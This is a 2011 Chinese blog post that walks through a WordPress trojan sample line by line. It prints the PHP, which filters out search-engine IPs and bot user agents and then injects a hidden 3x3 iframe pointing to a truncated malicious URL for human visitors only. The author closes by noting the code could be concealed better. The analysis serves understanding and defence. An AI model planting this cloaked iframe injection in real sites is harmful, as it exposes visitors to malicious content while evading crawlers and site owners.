title: 一个 Wordpress 木马样本分析
tags:
  - php
  - wordpress
  - 安全
id: 1507
categories:
  - 建站相关
date: 2011-09-18 03:41:08
---

在[饭否看到zuola说](http://fanfou.com/statuses/JreFlCzZgyM "佐拉 fanfou")得到一个[wordpress木马脚本](http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb "Zuola: wordpress木马样本")，于是就点了[连接](http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb "Zuola Diandian")，并简单的看了看这个样本。原理比较简单，先判断访问来源是否是搜索引擎的蜘蛛或bot，再确定是否显示一个有问题iframe——木马的效力也取决于这个iframe中的内容。这一小段PHP脚本也完全可以用到其它任何PHP程序中。

将源代码做了个简单的整理如下：<!--more-->

```php
error_reporting(0);
$bot = FALSE ;
$user_agent_to_filter = array('bot','spider','spyder'... ...'mybloglog api');
$stop_ips_masks = array(
array(&quot;216.239.32.0&quot;,&quot;216.239.63.255&quot;),
array(&quot;64.68.80.0&quot;  ,&quot;64.68.87.255&quot;  ),
... ... ...
... ... ...
array(&quot;72.30.0.0&quot;,&quot;72.30.255.255&quot;),
array(&quot;38.0.0.0&quot;,&quot;38.255.255.255&quot;)
);

$my_ip2long = sprintf(&quot;%u&quot;,ip2long($_SERVER['REMOTE_ADDR']));

foreach ( $stop_ips_masks as $IPs ) {
    $first_d=sprintf(&quot;%u&quot;,ip2long($IPs[0]));
    $second_d=sprintf(&quot;%u&quot;,ip2long($IPs[1]));
    if ($my_ip2long &gt;= $first_d &amp;&amp; $my_ip2long &lt;= $second_d) {
        $bot = TRUE;
        break;
    }
}

foreach ($user_agent_to_filter as $bot_sign){
    if(strpos($_SERVER['HTTP_USER_AGENT'], $bot_sign) !== false){
        $bot = true;
        break;
    }
}

if (!$bot) {
    echo '&lt;iframe src=&quot;http://whsej........o=1&quot; width=&quot;3&quot; height=&quot;3&quot;&gt;&lt;/iframe&gt;'
}
```

### 1、环境配置与变量声明

error_reporting(0)是为了保证在任何情况下都不报错。

$bot是声音了一个flag，默认值为false，从后面的情况来看，这个是用来表明当前访问者是否是真正的浏览用户。

$user_agent_to_filter和$stop_ips_masks，前者是一维数据，存储了一大堆需要排除的浏览器user_agent，后者是个二维数据，存储了若干个ip段，[这些ip段](http://www.ipchecking.com/?ip=209.85.128.0&amp;check=Lookup "$stop_ips_masks中的ip段")经查询，大都是搜索引擎的。

### 2、访问者ip的判断

接下来，是通过ip地址和浏览器user agent来进行用户是否是普通浏览器的判断。

```php
$my_ip2long = sprintf(&quot;%u&quot;,ip2long($_SERVER['REMOTE_ADDR']));

foreach ( $stop_ips_masks as $IPs ) {
    $first_d=sprintf(&quot;%u&quot;,ip2long($IPs[0]));
    $second_d=sprintf(&quot;%u&quot;,ip2long($IPs[1]));
    if ($my_ip2long &gt;= $first_d &amp;&amp; $my_ip2long &lt;= $second_d) {
        $bot = TRUE;
        break;
    }
}
```

[ip2long](http://php.net/manual/en/function.ip2long.php "ip2long：将ip地址转换为int")这个函数可以将ip地址转换成一个整数，[sprintf](http://php.net/manual/en/function.sprintf.php "PHP: sprinf")('%u', xxx)将这个int转换成无符号数。

foreach在$stop_ips_masks中进行循环，取二维数据中的每一个数组，$frist_d和$second_d分别存储ip段起点ip和止点ip的无符号整数值，再用接下来的if进行判断，当前访问者ip是否在$stop_ips_masks所指定的范围内，若是，则将$bot量置为true。

### 3、访问者user agent的判断

```php
foreach ($user_agent_to_filter as $bot_sign){
    if(strpos($_SERVER['HTTP_USER_AGENT'], $bot_sign) !== false){
        $bot = true;
        break;
    }
}
```

这一部分的判断与ip判断类似，从$user_agent_to_filter中读取每一个值，再与浏览者的user agent进行对比，如果发现是机器人或者蜘蛛，则将$bot置为true。

### 4、放置iframe

if(!$bot)控制当访问者是普通浏览器时，即放置这个iframe，iframe的scr是无耻者放置乱七八糟内容的网页——chrome已经将它block了。

### 5、结论

这个脚本可以用在任何php写成的网站中。而且，这段代码其实可以隐藏得更好，而不是这样连裤衩都不穿的裸奔。